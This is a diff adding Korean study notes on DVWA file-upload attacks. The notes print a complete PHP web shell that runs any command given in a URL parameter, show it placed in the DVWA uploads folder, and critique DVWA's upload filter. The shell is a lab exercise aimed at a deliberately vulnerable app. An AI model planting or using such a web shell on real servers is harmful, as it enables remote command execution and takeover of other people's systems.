@@ -89,3 +89,63 @@ Content-Type: image/gif
 
 **해결 방법**
 파일 확장자를 .asa 변경시키면 파일 업로드 가능하다.
+
+
+
+---
+
+## Deface 웹 사이트 변조
+
+
+```php
+|   |
+|---|
+|<html>|
+|<body>|
+|<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">|
+|<input type="TEXT" name="cmd" autofocus id="cmd" size="80">|
+|<input type="SUBMIT" value="Execute">|
+|</form>|
+|<pre>|
+|<?php|
+|if(isset($_GET['cmd']))|
+|{|
+|system($_GET['cmd'] . ' 2>&1');|
+|}|
+|?>|
+|</pre>|
+|</body>|
+|</html>|
+```
+
+
+아래 디렉토리로 webshell upload.
+```bash
+-rw-r--r--. 1 apache apache 10596 Aug  3 12:21 webshell.php
+[user@localhost ~]$ ls -al /var/www/html/dvwa/hackable/uploads/webshell.php
+-rw-r--r--. 1 apache apache 10596 Aug  3 12:21 /var/www/html/dvwa/hackable/uploads/webshell.php
+[user@localhost ~]$ ls -al /var/www/html/dvwa/hackable/uploads/webshell.php
+
+```
+
+php 환경에서 /dvwa/hackable/uploads/webshell.php 접속 시 **탈취** 가능
+
+
+
+```php
+<?php  
+  
+if( isset( $_POST[ 'Upload' ] ) ) {    // Where are we going to be writing to?    $target_path  = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/";    $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] );    // File information    $uploaded_name = $_FILES[ 'uploaded' ][ 'name' ];    $uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, '.' ) + 1);    $uploaded_size = $_FILES[ 'uploaded' ][ 'size' ];    $uploaded_tmp  = $_FILES[ 'uploaded' ][ 'tmp_name' ];    // Is it an image?    if( ( strtolower( $uploaded_ext ) == "jpg" || strtolower( $uploaded_ext ) == "jpeg" || strtolower( $uploaded_ext ) == "png" ) &&  
+        ( $uploaded_size < 100000 ) &&        getimagesize( $uploaded_tmp ) ) {
+```
+
+
+**High Level 필터 기능**
+1. png, jpeg, jpg
+2. file size
+3. image
+
+
+**소스 코드 문제**
+1. upload 경로 위치 ->  web root
+2. 이미지 파일이기 때문에 100% 안전하지 않음
